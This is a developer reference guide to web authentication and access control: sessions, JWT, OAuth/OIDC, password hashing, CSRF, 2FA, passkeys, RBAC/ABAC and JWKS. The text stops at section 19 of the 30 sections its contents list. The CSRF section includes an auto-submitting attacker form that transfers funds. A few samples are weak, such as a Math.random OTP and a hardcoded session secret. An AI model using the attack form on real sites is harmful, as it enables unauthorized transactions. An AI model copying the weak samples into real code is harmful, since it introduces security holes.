# Authentication and Authorization: Comprehensive Guide

> **Warning:** This is a reference document. Code examples may need updating for the latest browser/runtime versions. Always verify against [MDN Web Docs](https://developer.mozilla.org/) before using in production.

## Table of Contents

1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [Session-Based Authentication](#2-session-based-authentication)
3. [JWT (JSON Web Tokens)](#3-jwt-json-web-tokens)
4. [JWT Security](#4-jwt-security)
5. [OAuth 2.0](#5-oauth-20)
6. [OpenID Connect](#6-openid-connect)
7. [Passport.js](#7-passportjs)
8. [NextAuth.js / Auth.js](#8-nextauthjs--authjs)
9. [Password Hashing](#9-password-hashing)
10. [CSRF Protection](#10-csrf-protection)
11. [CORS Configuration](#11-cors-configuration)
12. [Rate Limiting and Brute Force Protection](#12-rate-limiting-and-brute-force-protection)
13. [Two-Factor Authentication (2FA)](#13-two-factor-authentication-2fa)
14. [Passkeys / WebAuthn](#14-passkeys--webauthn)
15. [Magic Links / Passwordless Authentication](#15-magic-links--passwordless-authentication)
16. [Social Login](#16-social-login)
17. [Role-Based Access Control (RBAC)](#17-role-based-access-control-rbac)
18. [Attribute-Based Access Control (ABAC)](#18-attribute-based-access-control-abac)
19. [JSON Web Key Set (JWKS)](#19-json-web-key-set-jwks)
20. [Token Revocation and Blacklisting](#20-token-revocation-and-blacklisting)
21. [Secure Cookie Attributes](#21-secure-cookie-attributes)
22. [HTTP Security Headers](#22-http-security-headers)
23. [Content Security Policy (CSP)](#23-content-security-policy-csp)
24. [Input Validation and Sanitization](#24-input-validation-and-sanitization)
25. [Common Vulnerabilities](#25-common-vulnerabilities)
26. [Authentication in REST vs GraphQL](#26-authentication-in-rest-vs-graphql)
27. [Microservices Authentication](#27-microservices-authentication)
28. [Zero Trust Architecture](#28-zero-trust-architecture)
29. [SSO (Single Sign-On)](#29-sso-single-sign-on)
30. [Compliance Considerations](#30-compliance-considerations)

---

## 1. Authentication vs Authorization

### Authentication (AuthN)
Authentication verifies **who you are**. It confirms the identity of a user, device, or system.

**Authentication factors (MFA categories):**
- **Something you know** — passwords, PINs, security questions
- **Something you have** — phones (SMS/OTP), hardware tokens (YubiKey), smart cards
- **Something you are** — fingerprints, face recognition, iris scans

**Common authentication methods:**
- Username/password
- Multi-factor authentication (MFA)
- Single sign-on (SSO)
- Social login (OAuth)
- Biometric authentication
- Passwordless (magic links, passkeys)

### Authorization (AuthZ)
Authorization determines **what you can do**. After authentication succeeds, authorization controls access to resources based on permissions, roles, or attributes.

**Common authorization methods:**
- Role-Based Access Control (RBAC)
- Attribute-Based Access Control (ABAC)
- Access Control Lists (ACL)
- OAuth 2.0 scopes

### Key Differences

| Aspect | Authentication | Authorization |
|--------|---------------|---------------|
| Purpose | Verify identity | Grant/deny access |
| Question | "Who are you?" | "What can you do?" |
| Order | Happens first | Happens after authN |
| Input | Credentials (password, biometrics) | Policies, roles, permissions |
| Output | Verified identity or session | Allow/deny decision |
| Standards | OpenID Connect, SAML, WebAuthn | OAuth 2.0, RBAC, ABAC |
| Failure mode | Unknown/impersonated identity | Overbroad access by real identity |

---

## 2. Session-Based Authentication

### How Sessions Work

HTTP is stateless — each request is independent. Sessions add state by storing user data on the server and tracking it via a unique session ID sent to the client in a cookie.

**Flow:**
1. User submits login credentials
2. Server validates credentials, creates a session, stores session data server-side
3. Server generates a unique session ID (SID) and sends it to the client via a cookie
4. Client sends the session ID cookie with every subsequent request
5. Server retrieves session data using the session ID

### express-session

The standard session middleware for Express.js:

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000
  }
}));

app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  if (user) {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/dashboard', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  res.json({ message: `Welcome user ${req.session.userId}` });
});

app.post('/logout', (req, res) => {
  req.session.destroy(err => {
    res.clearCookie('connect.sid');
    res.json({ success: true });
  });
});
```

### Session Storage Options

| Store | Use Case | Notes |
|-------|----------|-------|
| Memory (default) | Development only | Lost on restart, not scalable |
| Redis | Production | Fast, supports TTL, scalable |
| MongoDB (connect-mongo) | Production | Good if already using MongoDB |
| PostgreSQL (connect-pg-simple) | Production | ACID compliant |
| cookie-session | Lightweight | Data stored in cookie (4KB limit) |

### Sessions vs JWT

| Feature | Sessions | JWT |
|---------|----------|-----|
| Storage | Server-side | Client-side |
| Scalability | Requires shared store (Redis) | Stateless, horizontally scalable |
| Revocation | Easy (delete from store) | Hard (need blacklist) |
| Cookie size | Small (just session ID) | Large (full token) |
| Server memory | Required | Not required |
| Microservices | Complex | Natural fit |

---

## 3. JWT (JSON Web Tokens)

### What is a JWT?

A JWT (RFC 7519) is a compact, URL-safe token format for securely transmitting information as a JSON object. It is digitally signed (and optionally encrypted).

### JWT Structure

A JWT has three Base64URL-encoded parts separated by dots:

```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### 1. Header
Specifies the signing algorithm and token type:

```json
{ "alg": "HS256", "typ": "JWT" }
```

Common algorithms:
- `HS256` — HMAC-SHA256 (symmetric, shared secret)
- `RS256` — RSA-SHA256 (asymmetric, private/public key pair)
- `ES256` — ECDSA-SHA256 (asymmetric, smaller keys)
- `EdDSA` — Ed25519 (asymmetric, fast)

#### 2. Payload (Claims)
Contains claims — statements about the subject plus metadata:

```json
{
  "sub": "1234567890",
  "name": "Alice",
  "email": "alice@example.com",
  "role": "admin",
  "iat": 1740987200,
  "exp": 1741073600,
  "iss": "https://auth.example.com",
  "aud": "https://api.example.com"
}
```

**Standard claims:** `sub` (subject), `iss` (issuer), `aud` (audience), `exp` (expiration), `nbf` (not before), `iat` (issued at), `jti` (JWT ID).

**Important:** The payload is only encoded, NOT encrypted. Never put passwords or sensitive data in the payload.

#### 3. Signature
Verifies the token hasn't been tampered with:

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### JWT Authentication Flow

```
1. User logs in with credentials
2. Server validates credentials, creates JWT signed with secret/private key
3. Server sends JWT to client
4. Client stores JWT (ideally in httpOnly cookie)
5. Client sends JWT in Authorization: Bearer <token> header
6. Server verifies signature and reads claims
7. If token is expired or signature invalid, request is rejected
```

### Refresh Tokens

Access tokens are short-lived (5-15 minutes). Refresh tokens are long-lived (7-30 days) and used to obtain new access tokens.

```javascript
const ACCESS_SECRET = process.env.ACCESS_TOKEN_SECRET;
const REFRESH_SECRET = process.env.REFRESH_TOKEN_SECRET;
let refreshTokens = []; // In production, use a database

app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const accessToken = generateAccessToken(user);
  const refreshToken = jwt.sign(user, REFRESH_SECRET);
  refreshTokens.push(refreshToken);
  res.json({ accessToken, refreshToken });
});

app.post('/token', (req, res) => {
  const refreshToken = req.body.token;
  if (!refreshToken || !refreshTokens.includes(refreshToken)) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
  jwt.verify(refreshToken, REFRESH_SECRET, (err, user) => {
    if (err) return res.status(403);
    const accessToken = generateAccessToken({ id: user.id, name: user.name });
    res.json({ accessToken });
  });
});

function generateAccessToken(user) {
  return jwt.sign(user, ACCESS_SECRET, { expiresIn: '15m' });
}
```

---

## 4. JWT Security

### Algorithm Security

**Never accept `alg: "none"`.** Always enforce algorithm verification:

```javascript
// GOOD: Explicit algorithm specification
jwt.verify(token, publicKey, { algorithms: ['RS256'] });

// BAD: Trusting the token's header
jwt.verify(token, publicKey);
```

### Algorithm Confusion Attack
An attacker changes `alg` from RS256 to HS256 and signs using the **public key** as the HMAC secret. If the server naively uses the same key, verification succeeds. **Defense:** Never allow algorithm switching.

### Key Management Best Practices
- Use cryptographically strong secrets (minimum 256 bits / 32 bytes)
- Never hardcode secrets in source code
- Use environment variables or secret management (Vault, AWS Secrets Manager)
- Rotate keys regularly (30-90 days)
- Unique keys per environment

```bash
# Generate strong secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

### Token Rotation
- **Access tokens:** Short-lived (5-15 min), new token on each refresh
- **Refresh tokens:** Single-use, with family tracking for theft detection
- If a used refresh token is replayed, invalidate ALL tokens for that user

### Token Validation Checklist
1. Signature — verify cryptographic integrity
2. `iss` (issuer) — exact match for your IdP
3. `aud` (audience) — must include your API/client ID
4. `exp` (expiration) — reject expired tokens
5. `nbf` (not before) — reject tokens not yet valid
6. `sub` (subject) — required for user identity
7. Clock tolerance — allow 30-60s for clock skew

### Secure Token Storage

| Method | Security | Use Case |
|--------|----------|----------|
| httpOnly cookie | Best for web apps | Immune to XSS theft |
| In-memory (JS variable) | Good for SPAs | Lost on page refresh |
| localStorage | **Avoid** | Vulnerable to XSS |
| sessionStorage | **Avoid** | Vulnerable to XSS |

---

## 5. OAuth 2.0

### What is OAuth 2.0?

OAuth 2.0 (RFC 6749) is an **authorization framework** that enables third-party apps to obtain limited access to a user's resources without exposing credentials. It is **delegation**, not authentication.

### Four Roles
- **Resource Owner** — the user (data owner)
- **Client** — the application requesting access
- **Authorization Server** — issues tokens (e.g., Google's OAuth server)
- **Resource Server** — the protected API

### Grant Types

#### 1. Authorization Code Flow (Server-Side Apps)
```
1. Client redirects user to /authorize with:
   response_type=code, client_id, redirect_uri, scope, state

2. User authenticates and consents

3. Auth server redirects back with: code, state

4. Client exchanges code for tokens via POST /token:
   grant_type=authorization_code, code, client_id, client_secret, redirect_uri

5. Auth server returns: access_token, refresh_token, token_type, expires_in
```

#### 2. Authorization Code + PKCE (SPAs & Mobile Apps)
PKCE (RFC 7636) protects public clients that cannot store `client_secret`:

```javascript
const crypto = require('crypto');

function generatePKCE() {
  const codeVerifier = crypto.randomBytes(32).toString('base64url');
  const codeChallenge = crypto.createHash('sha256')
    .update(codeVerifier).digest('base64url');
  return { codeVerifier, codeChallenge };
}

// Authorization request includes code_challenge + code_challenge_method=S256
// Token exchange includes code_verifier instead of client_secret
// Server verifies: SHA256(code_verifier) === code_challenge
```

#### 3. Implicit Flow (DEPRECATED)
RFC 9700 explicitly recommends against this flow. Tokens were returned in the URL fragment — vulnerable to leakage. Use Authorization Code + PKCE instead.

#### 4. Client Credentials Flow (Machine-to-Machine)
```
POST /token
grant_type=client_credentials
client_id=service-a
client_secret=secret
scope=api:read api:write
```

### OAuth 2.0 Security Best Practices
- Always use `state` parameter for CSRF protection
- Use PKCE for all public clients
- Validate redirect URIs strictly (exact match)
- Use short-lived access tokens
- Implement refresh token rotation
- Never expose tokens in URLs
- Use HTTPS only

---

## 6. OpenID Connect (OIDC)

### What is OIDC?

OpenID Connect is an **authentication layer on top of OAuth 2.0**. OAuth 2.0 handles authorization ("what can this app access?"); OIDC handles identity ("who is this user?").

### OIDC Adds to OAuth 2.0
1. **ID Token** — JWT containing claims about the authenticated user
2. **UserInfo Endpoint** — API to fetch user profile information
3. **Standard Scopes** — `openid`, `profile`, `email`, `address`, `phone`
4. **Discovery** — Well-known endpoint publishing provider metadata
5. **Session Management** — Mechanisms for logout and session state

### ID Token

```json
{
  "iss": "https://auth.example.com",
  "sub": "user123",
  "aud": "my-client-app",
  "exp": 1741073600,
  "iat": 1740987200,
  "nonce": "n-0S6-wzA2Bj",
  "name": "Alice",
  "email": "alice@example.com",
  "email_verified": true
}
```

Key rules: ID token is for identity (not API calls), used once during login, never expose to client-side JS, always verify `iss`, `aud`, `exp`, `nonce`.

### UserInfo Endpoint

```
GET /userinfo
Authorization: Bearer <access_token>

{ "sub": "user123", "name": "Alice", "email": "alice@example.com" }
```

Verify that `sub` matches the ID token's `sub` (prevent token substitution attacks).

### OIDC Discovery

```
GET /.well-known/openid-configuration
→ { "issuer", "authorization_endpoint", "token_endpoint",
    "userinfo_endpoint", "jwks_uri", "scopes_supported", ... }
```

---

## 7. Passport.js

### What is Passport.js?

Passport.js is the most popular authentication middleware for Node.js, supporting **500+ authentication strategies** through a modular plugin architecture.

### Core Setup

```javascript
const passport = require('passport');
const session = require('express-session');

app.use(session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false }));
app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user.id));
passport.deserializeUser(async (id, done) => {
  const user = await User.findById(id);
  done(null, user);
});
```

### Local Strategy (Username/Password)

```javascript
const LocalStrategy = require('passport-local').Strategy;

passport.use(new LocalStrategy(async (username, password, done) => {
  const user = await User.findOne({ username });
  if (!user) return done(null, false, { message: 'Incorrect username.' });
  const isValid = await bcrypt.compare(password, user.password);
  if (!isValid) return done(null, false, { message: 'Incorrect password.' });
  return done(null, user);
}));

app.post('/login', passport.authenticate('local', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard'));
```

### JWT Strategy

```javascript
const JwtStrategy = require('passport-jwt').Strategy;
const ExtractJwt = require('passport-jwt').ExtractJwt;

passport.use(new JwtStrategy({
  jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
  secretOrKey: process.env.JWT_SECRET
}, async (payload, done) => {
  const user = await User.findById(payload.sub);
  return done(null, user || false);
}));

app.get('/profile', passport.authenticate('jwt', { session: false }), (req, res) => {
  res.json(req.user);
});
```

### Google OAuth Strategy

```javascript
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    let user = await User.findOne({ googleId: profile.id });
    if (!user) {
      user = await User.create({ googleId: profile.id, name: profile.displayName, email: profile.emails[0].value });
    }
    return done(null, user);
  }
));

app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));
app.get('/auth/google/callback', passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard'));
```

### Popular Strategies

| Strategy | Package | Use Case |
|----------|---------|----------|
| Local | passport-local | Username/password |
| JWT | passport-jwt | Token-based API auth |
| Google | passport-google-oauth20 | Google login |
| GitHub | passport-github2 | GitHub login |
| OpenID Connect | passport-openidconnect | Any OIDC provider |
| SAML | passport-saml | Enterprise SSO |

---

## 8. NextAuth.js / Auth.js

### What is NextAuth.js?

NextAuth.js (now Auth.js) is an open-source authentication toolkit for Next.js with 50+ built-in providers.

### v5 (Auth.js) Key Changes
- Configuration moves to root-level `auth.ts`
- `auth()` replaces `getServerSession`
- Adapters at `@auth/` scoped packages
- `AUTH_SECRET` replaces `NEXTAUTH_SECRET`

### Configuration (auth.ts)

```typescript
import NextAuth from "next-auth"
import GitHub from "next-auth/providers/github"
import Google from "next-auth/providers/google"
import Credentials from "next-auth/providers/credentials"
import { PrismaAdapter } from "@auth/prisma-adapter"

export const { handlers, auth, signIn, signOut } = NextAuth({
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  providers: [
    GitHub({ clientId: process.env.GITHUB_ID, clientSecret: process.env.GITHUB_SECRET }),
    Google({ clientId: process.env.GOOGLE_ID, clientSecret: process.env.GOOGLE_SECRET }),
    Credentials({
      credentials: { email: {}, password: {} },
      async authorize(credentials) {
        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
        if (!user) return null;
        const isValid = await bcrypt.compare(credentials.password, user.password);
        return isValid ? { id: user.id, name: user.name, email: user.email } : null;
      }
    })
  ],
  callbacks: {
    async signIn({ user, account }) { return true; },
    async jwt({ token, user }) { if (user) token.role = user.role; return token; },
    async session({ session, token }) { session.user.role = token.role; return session; }
  }
})
```

### Session Strategies

| Strategy | How it Works | Best For |
|----------|-------------|----------|
| JWT | Session data encoded in JWT cookie | Serverless, simple setups |
| Database | Session stored in database via adapter | Server-side session control |

---

## 9. Password Hashing

### Why Not Plain Hashes?

MD5 and SHA-256 are **too fast**. Modern GPUs compute billions of hashes per second. Password hashing algorithms are **intentionally slow** with salting and work factors.

### bcrypt

The battle-tested veteran (1999, Blowfish cipher):

```javascript
const bcrypt = require('bcryptjs');
const hash = await bcrypt.hash(password, 12);  // Cost factor 12
const isValid = await bcrypt.compare(password, hash);
```

- OWASP recommends minimum cost factor 10, comfortable at 12
- Limitation: 72-byte password limit, not memory-hard (~4KB RAM)

### scrypt

Memory-hard algorithm (2009):

```javascript
const crypto = require('crypto');
const salt = crypto.randomBytes(16).toString('hex');
crypto.scrypt(password, salt, 64, { N: 16384, r: 8, p: 1 }, (err, key) => { ... });
```

### Argon2 (Recommended for New Projects)

Winner of 2015 Password Hashing Competition. OWASP's first recommendation:

```javascript
const argon2 = require('argon2');
const hash = await argon2.hash(password, {
  type: argon2.argon2id, memoryCost: 65536, timeCost: 3, parallelism: 2
});
const isValid = await argon2.verify(hash, password);
```

### Comparison

| Feature | Argon2 | bcrypt | scrypt |
|---------|--------|--------|--------|
| Year | 2015 | 1999 | 2009 |
| Memory | Configurable (64MB+) | Fixed (~4KB) | Configurable |
| GPU/ASIC Resistance | Very High | Moderate | High |
| Side-channel Resistance | Yes (Argon2id) | Yes | No |
| OWASP Recommendation | First choice | Accepted | Accepted |
| Typical Hash Time | ~150ms | ~250ms | ~200ms |

---

## 10. CSRF Protection

### What is CSRF?

Cross-Site Request Forgery tricks an authenticated user's browser into sending unwanted requests. The browser automatically attaches session cookies to every request to a domain.

### Attack Scenario

```html
<!-- On attacker's site -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.forms[0].submit()</script>
```

### Prevention Methods

**1. Anti-CSRF Tokens (Synchronizer Token Pattern)**
```javascript
// Server generates token per session
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Include in forms
app.get('/form', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Client sends as header
axiosInstance.defaults.headers.post['x-csrf-token'] = data.csrfToken;
```

**2. SameSite Cookies**
```
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
```
- `Strict` — Never sent cross-site (most secure)
- `Lax` — Sent for top-level GET navigations only (default in Chrome/Edge)
- `None` — Sent cross-site (requires `Secure`)

**3. Origin/Referer Header Validation**
```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith(process.env.ALLOWED_ORIGIN)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});
```

**4. Double Submit Cookie Pattern**
Token stored in cookie AND sent in request header; server compares both values.

---

## 11. CORS Configuration

### What is CORS?

Cross-Origin Resource Sharing controls which origins can access your API. Browsers enforce the Same-Origin Policy by default.

### Express.js CORS Setup

```javascript
const cors = require('cors');

// Permissive (development only)
app.use(cors());

// Restrictive (production)
app.use(cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400  // Preflight cache: 24 hours
}));
```

### Key Headers

| Header | Purpose |
|--------|---------|
| `Access-Control-Allow-Origin` | Which origins are allowed |
| `Access-Control-Allow-Methods` | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Which headers are allowed |
| `Access-Control-Allow-Credentials` | Whether cookies/auth headers are allowed |
| `Access-Control-Max-Age` | How long to cache preflight response |

### CORS Security Best Practices
- Never use `Access-Control-Allow-Origin: *` with credentials
- Whitelist specific origins
- Limit allowed methods and headers
- Use preflight caching to reduce overhead
- Credentials require explicit origin (not `*`)

---

## 12. Rate Limiting and Brute Force Protection

### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// General rate limiter
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                    // 100 requests per window
  message: 'Too many requests',
  standardHeaders: true,
  legacyHeaders: false
});

// Strict limiter for login endpoints
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                      // 5 attempts per 15 minutes
  message: 'Too many login attempts',
  skipSuccessfulRequests: true
});

app.use('/api/', limiter);
app.use('/auth/login', loginLimiter);
```

### Brute Force Protection Strategies
1. **Account lockout** — Lock after N failed attempts (with time-based unlock or admin reset)
2. **Progressive delays** — Increase delay between attempts exponentially
3. **CAPTCHA** — Require after N failed attempts
4. **IP blocking** — Block IPs with excessive failed attempts
5. **Alerting** — Notify admin/user of suspicious login patterns

---

## 13. Two-Factor Authentication (2FA)

### TOTP (Time-Based One-Time Password)

Apps like Google Authenticator, Authy, or 1Password:

```javascript
const speakeasy = require('speakeasy');

// Generate secret
const secret = speakeasy.generateSecret({ name: 'MyApp' });

// Verify token
const isValid = speakeasy.totp.verify({
  secret: secret.base32,
  encoding: 'base32',
  token: '123456',
  window: 1  // Allow 30-second window
});
```

### SMS/Email OTP

```javascript
const twilio = require('twilio');

// Generate 6-digit code
const code = Math.floor(100000 + Math.random() * 900000).toString();

// Store with expiration in database
await db.otpCodes.create({ userId, code, expiresAt: Date.now() + 5 * 60 * 1000 });

// Send via SMS
await twilioClient.messages.create({
  body: `Your verification code is: ${code}`,
  to: phoneNumber,
  from: process.env.TWILIO_PHONE
});
```

### 2FA Flow
1. User enters username/password
2. Server verifies credentials
3. Server prompts for 2FA code
4. User provides TOTP code or receives SMS/email code
5. Server verifies the 2FA code
6. Session/access token issued only after both factors verified

---

## 14. Passkeys / WebAuthn

### What are Passkeys?

Passkeys are FIDO2/WebAuthn credentials that replace passwords with cryptographic key pairs bound to devices. They use biometrics (fingerprint, face) or device PINs for user verification.

### WebAuthn Registration

```javascript
const { generateRegistrationOptions } = require('@simplewebauthn/server');

app.get('/webauthn/register-options', async (req, res) => {
  const options = await generateRegistrationOptions({
    rpName: 'My App',
    rpID: 'example.com',
    userID: user.id,
    userName: user.email,
    attestationType: 'none',
    authenticatorSelection: {
      residentKey: 'preferred',
      userVerification: 'preferred'
    }
  });
  // Store challenge in session
  req.session.currentChallenge = options.challenge;
  res.json(options);
});
```

### WebAuthn Authentication

```javascript
const { generateAuthenticationOptions } = require('@simplewebauthn/server');

app.get('/webauthn/auth-options', async (req, res) => {
  const options = await generateAuthenticationOptions({
    rpID: 'example.com',
    userVerification: 'preferred'
  });
  req.session.currentChallenge = options.challenge;
  res.json(options);
});

app.post('/webauthn/verify', async (req, res) => {
  const verification = await verifyAuthenticationResponse({
    response: req.body,
    expectedChallenge: req.session.currentChallenge,
    expectedOrigin: 'https://example.com',
    expectedRPID: 'example.com',
    authenticator: authenticators[0]
  });
  if (verification.verified) {
    // Issue session/token
  }
});
```

### Passkey Benefits
- Phishing-resistant (bound to origin)
- No passwords to remember or steal
- Biometric authentication on device
- Supported by Apple, Google, Microsoft

---

## 15. Magic Links / Passwordless Authentication

### How Magic Links Work

1. User enters email address
2. Server generates a unique, single-use token
3. Server sends an email with a link containing the token
4. User clicks the link
5. Server validates token, creates session/account
6. User is authenticated

```javascript
const crypto = require('crypto');

app.post('/auth/magic-link', async (req, res) => {
  const { email } = req.body;
  const token = crypto.randomBytes(32).toString('hex');
  const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes

  await db.magicLinks.create({ email, token, expiresAt });

  await sendEmail({
    to: email,
    subject: 'Sign in to MyApp',
    html: `<a href="https://myapp.com/auth/verify?token=${token}">Click to sign in</a>`
  });

  res.json({ message: 'Check your email' });
});

app.get('/auth/verify', async (req, res) => {
  const { token } = req.query;
  const record = await db.magicLinks.findOne({
    token,
    expiresAt: { $gt: new Date() }
  });

  if (!record) return res.status(401).json({ error: 'Invalid or expired token' });

  // Delete used token
  await db.magicLinks.deleteOne({ _id: record._id });

  // Create/update user and issue session
  const user = await findOrCreateUser(record.email);
  req.session.userId = user.id;
  res.redirect('/dashboard');
});
```

### Security Best Practices
- Tokens must be cryptographically random (128+ bits)
- Single-use — delete after verification
- Short expiration (5-15 minutes)
- Rate limit requests to prevent email flooding
- Use `no-reply` sender address
- Include token in URL path, not query string (to prevent Referer leakage)

---

## 16. Social Login

### How Social Login Works (OAuth 2.0)

```
1. User clicks "Sign in with Google"
2. App redirects to Google's authorization endpoint
3. User authenticates with Google and consents
4. Google redirects back with authorization code
5. App exchanges code for tokens
6. App fetches user profile from Google
7. App creates/finds local user account
8. App issues session or JWT
```

### Supported Providers

| Provider | Protocol | Key Scopes |
|----------|----------|------------|
| Google | OAuth 2.0 / OIDC | `profile`, `email` |
| GitHub | OAuth 2.0 | `user:email` |
| Apple | OAuth 2.0 / OIDC | `name`, `email` |
| Facebook | OAuth 2.0 | `public_profile`, `email` |
| Microsoft | OAuth 2.0 / OIDC | `profile`, `email` |

### Account Linking Strategy

```javascript
async function handleOAuthLogin(profile) {
  // Check if user exists by OAuth provider ID
  let user = await db.users.findOne({ provider: 'google', providerId: profile.id });

  if (!user) {
    // Check if user exists by email
    user = await db.users.findOne({ email: profile.email });

    if (user) {
      // Link OAuth account to existing user
      await db.accounts.create({ userId: user.id, provider: 'google', providerId: profile.id });
    } else {
      // Create new user
      user = await db.users.create({
        name: profile.displayName,
        email: profile.email,
        avatar: profile.photo,
        emailVerified: profile.emailVerified
      });
      await db.accounts.create({ userId: user.id, provider: 'google', providerId: profile.id });
    }
  }

  return user;
}
```

---

## 17. Role-Based Access Control (RBAC)

### What is RBAC?

RBAC assigns permissions based on roles rather than individual users. Users inherit permissions through role assignments.

### Hierarchy of RBAC Concepts

```
Users → Roles → Permissions → Resources
```

### Implementation

```javascript
const ROLES = {
  ADMIN: ['read', 'write', 'delete', 'manage_users'],
  EDITOR: ['read', 'write'],
  VIEWER: ['read']
};

function authorize(...requiredPermissions) {
  return (req, res, next) => {
    const userRoles = req.user.roles;
    const userPermissions = userRoles.flatMap(role => ROLES[role] || []);
    const hasPermission = requiredPermissions.every(p => userPermissions.includes(p));

    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage
app.get('/admin/users', authorize('manage_users'), adminController.listUsers);
app.post('/posts', authorize('write'), postController.create);
app.get('/posts', authorize('read'), postController.list);
```

### Database Schema for RBAC

```sql
CREATE TABLE roles (
  id SERIAL PRIMARY KEY,
  name VARCHAR(50) UNIQUE NOT NULL
);

CREATE TABLE permissions (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) UNIQUE NOT NULL
);

CREATE TABLE role_permissions (
  role_id INT REFERENCES roles(id),
  permission_id INT REFERENCES permissions(id),
  PRIMARY KEY (role_id, permission_id)
);

CREATE TABLE user_roles (
  user_id INT REFERENCES users(id),
  role_id INT REFERENCES roles(id),
  PRIMARY KEY (user_id, role_id)
);
```

---

## 18. Attribute-Based Access Control (ABAC)

### What is ABAC?

ABAC evaluates access based on attributes of the **subject**, **resource**, **action**, and **environment** — not just roles.

### Policy Example

```
IF subject.department == "engineering"
AND resource.classification == "internal"
AND action == "read"
AND environment.time BETWEEN "09:00" AND "18:00"
THEN ALLOW
```

### Implementation

```javascript
const policies = [
  {
    name: 'engineer-read-internal',
    effect: 'allow',
    conditions: {
      'subject.department': 'engineering',
      'resource.classification': 'internal',
      'action': 'read'
    }
  },
  {
    name: 'admin-full-access',
    effect: 'allow',
    conditions: {
      'subject.role': 'admin'
    }
  }
];

function evaluatePolicy(subject, resource, action, environment) {
  for (const policy of policies) {
    const matches = Object.entries(policy.conditions).every(([key, value]) => {
      const [entity, attribute] = key.split('.');
      const obj = { subject, resource, action, environment }[entity];
      return obj && obj[attribute] === value;
    });

    if (matches) return policy.effect === 'allow';
  }
  return false; // Default deny
}

app.use('/api/', (req, res, next) => {
  const allowed = evaluatePolicy(
    req.user,
    { classification: getResourceClassification(req.path) },
    req.method,
    { time: new Date().toISOString() }
  );
  if (!allowed) return res.status(403).json({ error: 'Access denied' });
  next();
});
```

### RBAC vs ABAC

| Feature | RBAC | ABAC |
|---------|------|------|
| Basis | Roles | Attributes |
| Complexity | Low | High |
| Granularity | Coarse | Fine-grained |
| Scalability | Limited by role count | Highly scalable |
| Dynamic | Static roles | Context-aware |
| Best for | Simple apps | Enterprise/compliance |

---

## 19. JSON Web Key Set (JWKS)

### What is JWKS?

JWKS (JSON Web Key Set) is a standard for publishing public keys used to verify JWTs. It enables key rotation without breaking existing tokens.

### JWKS Endpoint

```
GET https://auth.example.com/.well-known/jwks.json

{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-2024-01",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuu...",
      "e": "AQAB"
    },
    {
      "kty": "RSA",
      "kid": "key-2024-02",
      "use": "sig",
      "alg": "RS256",
      "n": "4cTf3qS9OjIi...",
      "e": "AQAB"
    }
  ]
}
```

### Key Rotation Procedure

1. Generate new key pair with new `kid`
2. Publish both keys in JWKS endpoint (old + new)
3. Start signing new tokens with the new key
4. Wait for old tokens to expire (at least one access token lifetime)
5. Remove old key from JWKS endpoint

### Using JWKS for Verification

```javascript
const jwksClient = require('jwks-rsa');

const client = jwksClient({
  jwksUri: 'https://auth.example.com/.well-known/jwks.json',
  cache: true,
  cacheMaxEntries: 5,
  cacheMaxAge: 600000  // 10 minutes
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    const signingKey = key.getPublicKey();
    callback(null, signingKey);
  });
}

jwt.verify(token, getKey, { algorithms: ['RS256'] }, (err, decoded) => {
  // Handle result
});
```

